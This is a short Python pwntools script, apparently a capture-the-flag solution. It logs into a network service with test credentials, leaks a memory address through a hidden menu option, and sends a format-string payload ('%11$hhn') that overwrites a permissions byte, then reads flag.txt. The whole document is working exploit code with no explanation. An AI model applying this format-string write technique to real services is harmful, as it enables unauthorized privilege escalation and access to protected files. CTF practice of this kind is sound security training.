from pwn import *
import struct

username = 'test'
password = 'test'

p = remote( "10.0.0.102", 5353 )

p.recvuntil( "Username: " )
p.sendline( username )

p.recvuntil( "[?] Enter the password: " )
p.sendline( password )

p.recvuntil( ">>> " )
p.sendline( "1337" )


p.recvuntil( " desc = " )
permissionsAddr = int( p.recvline(), 16 ) + 64

p.recvuntil( ">>> ")
p.sendline( "5" )
p.recvuntil( "Write new description: " )

buf = struct.pack( "<L", permissionsAddr ) + " %11$hhn"
p.sendline( buf )
p.recvuntil( ">>> " )

p.sendline( "3" )

print p.recvuntil( ">>> " )

p.sendline( "2" )
p.recvuntil( "[?] Enter the file name: " )
p.sendline( "flag.txt" )

print p.recvuntil( "-- User menu --" )
